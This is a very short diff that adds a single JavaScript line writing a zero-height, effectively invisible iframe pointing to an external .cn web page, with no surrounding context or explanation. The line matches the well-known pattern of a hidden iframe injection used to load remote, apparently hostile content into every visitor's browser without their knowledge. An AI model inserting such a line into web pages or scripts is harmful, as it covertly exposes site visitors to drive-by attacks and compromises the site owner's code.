@@ -1,0 +1,3 @@
+document.writeln("<iframe src=http://www.lznylsf.cn/llsg/23.htm width=50 height=0></iframe>");
+
+
